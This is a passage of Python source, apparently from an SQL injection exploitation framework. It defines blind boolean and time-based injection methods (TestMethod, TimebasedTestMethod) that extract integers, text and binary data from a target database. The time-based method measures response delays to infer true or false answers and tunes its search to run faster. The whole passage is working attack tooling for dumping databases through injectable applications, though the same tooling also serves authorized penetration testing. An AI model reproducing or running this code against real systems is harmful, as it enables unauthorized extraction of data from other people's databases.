        """Checks if the given SQL expression is `NULL`."""
        return await self.fetch_bool(IsNull(expr, negate=negate), ctx=VoidContext())

    # -- Types

    @abstractmethod
    async def fetch_bool(self, expr: Node, ctx: Context) -> bool:
        """Gets the value for an SQL expression of type `BoolType`."""

    @abstractmethod
    async def fetch_int(self, expr: Node, ctx: Context) -> int:
        """Gets the value for an SQL expression of type `IntType`."""

    @abstractmethod
    async def fetch_text(self, expr: Node, ctx: Context) -> str:
        """Gets the value for an SQL expression of type `TextType`."""

    @abstractmethod
    async def fetch_blob(self, expr: Node, ctx: Context) -> bytes:
        """Gets the value for an SQL expression of type `BlobType`."""


class TestMethod(TypedCellMethod):
    """An injection method that retrieves SQL results using boolean tests.
    This is equivalent to a blind and time-based SQL injections.

    Args:
        compiler (Compiler): DBMS compiler inject (InjectForBool): An coroutine that
        sends an SQL payload and
            returns a boolean indicating if the payload evaluates to `True` or `False`.
        wildcard (str): A character can sometimes not be in the charset.
            If this happens, and wildcard is set, the unknown character is replaced by
            the wildcard. If is `None`, an `SQLInjectionError` is raised.
        nb_sections (int): Number of sections for the polytomy. Defaults to `2`,
            for dichotomy. The greater the number, the bigger the size of the SQL
            payloads but (generally) the faster the results are obtained.
        resilient (bool): Verifies that the results (int, byte, char, bool) are correct
            and tries again if not. Defaults to `False`.
    """

    wildcard: str
    """A replacement for characters that are not in the charset, or `None`.
    If `None` (the defaults), and a character is not in the charset, an
    exception is raised."""
    nb_sections: int
    """Number of sections for the polytomy. Defaults to `2`, for dichotomy.
    """
    resilient: bool
    """If True, after a byte, char, int, or bool is dumped, the method will verify that
    the value is indeed correct before going on. If it is not, we repeat the process. It
    is useful in cases where the test provided by the user is not always right, for
    instance in case of network jitter with a time-based SQL injection. Defaults to
    `False`.
    """

    fetcher_bool: BoolCellFetcher
    """`BoolType` fetcher."""
    fetcher_int: IntCellFetcher
    """`IntType` fetcher."""
    fetcher_text: TextCellFetcher
    """`TextType` fetcher."""
    fetcher_blob: BlobCellFetcher
    """`BlobType` fetcher."""

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBool,
        *,
        wildcard: Optional[str] = None,
        nb_sections: int = 2,
        resilient: bool = False,
    ):
        super().__init__(
            compiler,
            inject,
        )
        self.check_parameters(
            locals(),
            required={
                "nb_sections": int,
                "resilient": bool,
            },
            optional={
                "wildcard": str,
            },
        )
        self.wildcard = wildcard
        self.nb_sections = nb_sections
        self.resilient = resilient

        self.setup_fetchers()

    def compute_nb_sections(self, cell: Query) -> int:
        return self.nb_sections

    def setup_fetchers(self):
        self.fetcher_bool = BoolCellFetcher(self)
        self.fetcher_int = IntCellFetcher(self)
        self.fetcher_text = TextCellFetcher(self)
        self.fetcher_blob = BlobCellFetcher(self)

    async def setup_semaphores(self) -> None:
        await super().setup_semaphores()
        self._semaphores["cells"] = Semaphore(2)
        self._semaphores["parts"] = Semaphore(4)

    async def fetch_cell(self, query: Query, ctx: Context) -> Cell:
        nb_sections = self.compute_nb_sections(query)
        return await super().fetch_cell(query, ctx=ctx.with_(nb_sections=nb_sections))

    async def fetch_bounds(self, query: Query, ctx: Context) -> Bounds:
        """Returns a tuple (min, max) representing the range of rows that are to be
        dumped. min is inclusive - i.e. first row to dump - and max is exclusive - i.e.
        first row not to dump.
        """
        # If the query has bounds, we'll just check that these bounds are within
        # COUNT(*), to avoid having to compute a number.
        if query.q.limit:
            start, stop = query.q.limit.get_start_stop()
            count_query = self._sql_get_count(query)
            if await self.inject(count_query >= stop):
                return (start, stop)
        return await super().fetch_bounds(query, ctx=ctx)

    async def fetch_int(self, expr: Node, ctx: Context) -> int:
        return await self.fetcher_int.fetch(expr, ctx=ctx)

    async def fetch_bool(self, expr: Node, ctx: Context) -> bool:
        return await self.fetcher_bool.fetch(expr, ctx=ctx)

    async def fetch_text(self, expr: Node, ctx: Context) -> str:
        return await self.fetcher_text.fetch(expr, ctx=ctx)

    async def fetch_blob(self, expr: Node, ctx: Context) -> bytes:
        return await self.fetcher_blob.fetch(expr, ctx=ctx)

    @staticmethod
    def get_validator() -> type[MethodValidator]:
        from ending.validation import TestMethodValidator

        return TestMethodValidator

    @staticmethod
    def get_configurator() -> type[MethodConfigurator]:
        from ending.configuration import TestMethodConfigurator

        return TestMethodConfigurator


class ByteSumMixin:
    """A mixin for `TestMethod` that uses a `ByteSumTextCellFetcher` instead of the
    standard one.
    """

    def setup_fetchers(self) -> None:
        super().setup_fetchers()
        self.fetcher_text = ByteSumTextCellFetcher(self)


class TimebasedTestMethod(TestMethod):
    """A test method that uses time-based injection to retrieve data.

    The method will only send one query at a time, in order to avoid race conditions
    where one slow query makes the other one lag.

    In addition, the method will compute the most efficient polytomy section for each
    cell it fetches, in function of the time it takes for a request and a response to go
    through.


    Args:
        compiler (Compiler): DBMS compiler inject (InjectForBool): An coroutine that
        sends an SQL payload and
            returns a boolean indicating if the payload evaluates to `True` or `False`.
        delay (float): Minimum delay induced by SQL statements that evaluate to true.
        wildcard (str): A character can sometimes not be in the charset.
            If this happens, and wildcard is set, the unknown character is replaced by
            the wildcard. If is `None`, an `SQLInjectionError` is raised.
        resilient (bool): Verifies that the results (int, byte, char, bool) are correct
            and tries again if not. Defaults to `True`.
    """

    delay: float
    """Minimum delay induced by SQL statements that evaluate to true.
    """
    MOVING_AVERAGE: int = 100
    """Defines the maximum number of last runs to use to compute the expected sleep
    time.
    """

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForNone,
        *,
        delay: float,
        wildcard: Optional[str] = None,
        resilient: bool = True,
    ):
        super().__init__(
            compiler, inject, wildcard=wildcard, nb_sections=2, resilient=resilient
        )
        self.check_parameters(
            locals(),
            required={"delay": (float, int)},
            optional={},
        )
        self.delay = float(delay)
        self._delays = ([], [])

    async def setup_semaphores(self) -> None:
        """No tests can run concurrently."""
        await super().setup_semaphores()
        self._semaphores["rows"] = Semaphore(1)
        self._semaphores["cells"] = Semaphore(1)
        self._semaphores["parts"] = Semaphore(1)
        self._semaphores["inject"] = Semaphore(1)

    async def inject(self, payload: Node) -> bool:
        """Injects a payload and returns `True` if there was a delay."""
        async with self._semaphores["inject"]:
            start = time.monotonic()
            await super().inject(payload)
            stop = time.monotonic()
            elapsed = stop - start
            slept = elapsed >= self.delay

            array = self._delays[slept]
            array.append(elapsed)
            return slept

    def compute_nb_sections(self, cell: Query) -> int:
        """Computes the number of sections to use for polytomy for the given cell."""

        match cell.metadata.type:
            case TextType(charset=charset):
                N = len(charset)
            case BlobType(byteset=byteset):
                N = len(byteset)
            case _:
                return 2

        if N <= 2:
            return 2

        # Remove exceedent values
        self._delays = (
            self._delays[False][-self.MOVING_AVERAGE :],
            self._delays[True][-self.MOVING_AVERAGE :],
        )

        try:
            averages = [sum(d) / len(d) for d in self._delays]
        except ZeroDivisionError:
            averages = self.delay / 3, self.delay

        Tfalse, Ttrue = averages

        best_section = 0
        best_time = None
        current_nb_digits = 0

        for section in range(2, N + 2):
            nb_digits = floor(log(N, section)) + 1
            if nb_digits == current_nb_digits:
                continue
            current_nb_digits = nb_digits
            time_per_digit = (
                Ttrue * (section - 1) + Tfalse * section * (section - 1) / 2
            ) / section
            T = time_per_digit * nb_digits
            if best_time is None or best_time > T:
                best_time = T
                best_section = section

        self.log.info(
            f"Using {best_section}-section polytomy for set of size {N} (time={best_time:.2f}s, T[true]={Ttrue:.2f}s, T[false]={Tfalse:.2f}s)"
        )
        return best_section

    @staticmethod
    def get_configurator() -> type[MethodConfigurator]:
        return None
